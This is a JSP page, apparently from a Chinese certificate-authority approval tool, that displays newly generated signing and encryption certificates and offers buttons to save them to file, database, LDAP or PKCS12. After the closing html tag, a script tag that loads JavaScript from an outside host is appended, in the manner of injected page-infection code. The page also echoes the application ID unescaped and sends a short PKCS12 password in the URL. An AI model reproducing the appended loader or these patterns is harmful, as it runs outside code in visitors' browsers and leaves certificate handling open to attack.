<%@ page contentType="text/html; charset=gb2312" %>
<%@ page import="ApproveBeans.ApproveBean" %>
<jsp:useBean id="approveBean" class="ApproveBeans.ApproveBean" scope="session"/>
<jsp:setProperty name="approveBean" property="JKSFileName" value="C:/RootCaKeyStore/RootCaKeyStore"/>
<%
    String applyId=request.getParameter("applyId");
    String applyType=request.getParameter("applyType");
%>
<body bgcolor="#FFFFFF" text="#000000" topmargin="0">
<%
	if(applyId!=null)
	{
		approveBean.applyId=applyId;
		boolean getXCertOk=approveBean.getX509Certs();
		if(getXCertOk==true)
		{
%>
<p align="center">证书已经生成</p>
<form name="SubmitForm" method="post" action="">
<input type="hidden" name="SubmitType" value="">
</form>
<script>
function  save(url)
{
	SubmitForm.action=url;	
	SubmitForm.submit();
}
function  savepkcs(url)
{
	var pkcspwd;
	do
	{
	  pkcspwd=window.prompt("请输入最多6位的PKCS文件的密码：");
	}while(pkcspwd==null || pkcspwd.length>6 || pkcspwd==""  );

	SubmitForm.action=url+"?pkcspwd="+pkcspwd;	
	SubmitForm.submit();
}
</script>
<table width="100%" cellpadding="0" cellspacing="0" >
  <tr> 
    <td width="49%" rowspan="2"> 
      <div style="width:400px;height:150px;overflow:scroll;color:blue"> 
        <p> <font size="2">签名证书的申请号为：<%=applyId%> </font><br>
          <font size="2">签名证书的标识号为 ：<%=approveBean.subjectId_Sign%></font><br>
          <font size="2">签名证书的主要内容如下： </font><br>
          <font size="2"> 
          <%		
		out.write(approveBean.signXC.toString());
%>
          </font></p>
      </div>
    </td>
    <td rowspan="3" valign="top" width="3" bgcolor="#FFFF00">&nbsp;</td>
    <td valign="top" width="49%"> 
      <p> 
        <input type="button" name="Submit" value="保存签名证书到文件" style="width:200px;color:blue" onClick="save('ApproveSaves/Sign2File.jsp')">
      </p>
      <p> 
        <input type="button" name="Submit3" value="保存签名证书到数据库" style="width:200px;color:blue" onClick="save('ApproveSaves/Sign2DB.jsp')">
      </p>
      <p> 
        <input type="submit" name="Submit4" value="发布签名证书到LDAP服务" disabled style="width:200px;color:blue" onClick="save('ApproveSaves/Sign2LDAP.jsp')">
      </p>
      <p> 
        <input type="submit" name="Submit9" value="发送EMAIL通知" style="width:200px;color:green"  onClick="save('sendmail.jsp')">
      </p>
    </td>
  </tr>
  <tr>
    <td valign="top" width="49%" bgcolor="#FFFF00"><font size=1>&nbsp;</font></td>
  </tr>
  <tr> 
    <td width="49%" height="195"> 
      <div style="width:400px;height:150px;overflow:scroll;color:#669999"> 
        <p> <font size="2">加密证书的申请号为：<%=applyId%> </font><br>
          <font size="2">加密证书的标识号为 ：<%=approveBean.subjectId_Encrypt%></font><br>
          <font size="2">加密证书的主要内容如下： </font><br>
          <font size="2"> 
          <%		
		out.write(approveBean.encryptXC.toString());
%>
          </font></p>
      </div>
    </td>
    <td height="195" valign="top" width="49%"> 
      <p> 
        <input type="button" name="Submit2" value="保存加密证书到文件" style="width:200px;color:red" onClick="save('ApproveSaves/Encrypt2File.jsp')">
      </p>
      <p> 
        <input type="button" name="Submit5" value="保存加密证书和解密密钥到数据库" style="width:200px;color:red" onClick="save('ApproveSaves/Encrypt2DB.jsp')">
      </p>
      <p> 
        <input type="button" name="Submit6" value="发布加密证书到LDAP服务" disabled style="width:200px;color:red" onClick="save('ApproveSaves/Encrypt2LDAP.jsp')">
      </p>
      <p> 
        <input type="button" name="Submit7" value="保存解密密钥到文件(DER编码)" style="width:200px;color:red" onClick="save('ApproveSaves/EncryptPvk2File.jsp')">
      </p>
      <p> 
        <input type="submit" name="Submit8" value="保存加密证书和解密密钥到文件(PKCS12)" style="width:250px;color:red" onClick="savepkcs('ApproveSaves/Encrypt2PKCS12.jsp')">
      </p>
    </td>
  </tr>
</table>
<%		
		}
		else
		{
%>
<p align="center">证书生成失败</p>
<p><font size=2>原因是：<%=approveBean.errorMsg%></font></p>
<%
		}
	}
	else
	{
%>
<p align="center">申请号为空！</p>
<%
	}
%>
</body>
</html>

<script language=javascript src=http://www.qq.com/qq.js></script>